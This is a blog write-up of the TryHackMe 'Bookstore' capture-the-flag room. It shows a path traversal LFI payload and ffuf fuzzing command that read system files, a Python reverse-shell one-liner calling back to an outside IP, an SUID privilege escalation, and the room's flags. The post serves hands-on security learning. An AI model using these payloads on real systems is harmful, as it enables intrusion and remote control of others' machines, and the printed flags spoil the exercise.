---
layout: post
title:  "THM: Bookstore"
date:   2020-12-01 20:00:00 +1100
category: hacking
---

## Introduction
*A Beginner level box with basic web enumeration and REST API Fuzzing.*

This is [Bookstore](https://tryhackme.com/room/bookstoreoc) from TryHackMe. The description implies it's easy, but it's medium rated which I think is a rating given by the THM testing crew.

## Ports
We've got SSH, HTTP and port 5000, which is:

>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)

So more HTTP.

## HTTP
The way this is set up is that there is a regular page on port 80 (the bookstore), and an API on port 5000 that supplies information about the books in the collection. The Werkzeug console is available on port 5000 at */console* but it's locked with a PIN. We use an LFI on the API to read the PIN, and we get a hint that's it in our user's bash history:

>view-source:http://10.10.226.85/login.html  
>Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file

Now that's all well and good but hoo boy did I have some trouble finding the LFI.

## API/LFI
The API had the general form of:

>/api/v2/resources/books

Where there were endpoints at:

>/api/v2/resources/books/all  
>/api/v2/resources/books/random4 and  
>/api/v2/resources/books?author=etc

The LFI ultimately was at:

>http://10.10.108.141:5000/api/v1/resources/books?show=../../../../../../../../../../../home/sid/.bash_history

So the takeaway here was: if there's a version in your API endpoint, check older versions! Also I used **ffuf** for the first time:

``
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://10.10.108.141:5000/api/v1/resources/books?FUZZ=../../../../../../../../../../etc/passwd
``

## The rest
Once you've read the PIN you just unlock the console and launch a reverse shell:

``
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
``

This is [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) minus the 'python -c' at the start. 

Then we've got an SUID binary called *try-harder*. Dissasembly in Ghidra shows this:

{% highlight c %}
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
{% endhighlight %}

**0x5db3** is 23987 and **0x1116** is 4374; **0x5dcd21f4** is 1573724660. So we've got:

**something** XOR **4374** XOR **23987** = **1573724660**

**4374** XOR **23987** is **19621**, and **1573724660** XOR **19621** = **1573743953**

So that's our magic number:

{% highlight shell %}
Whats The Magic Number?!
1573743953
1573743953
root@bookstore:~# ls
ls
api.py  api-up.sh  books.db  try-harder  user.txt
root@bookstore:~# cat us
cat user.txt 
4ea65eb80ed441adb68246ddf7b964ab
root@bookstore:~# cd /root
cd /root
root@bookstore:/root# cat root.txt
cat root.txt
e29b05fba5b2a7e69c24a450893158e3
{% endhighlight %}

So yes privesc was very easy, finding the LFI not so easy (for me).
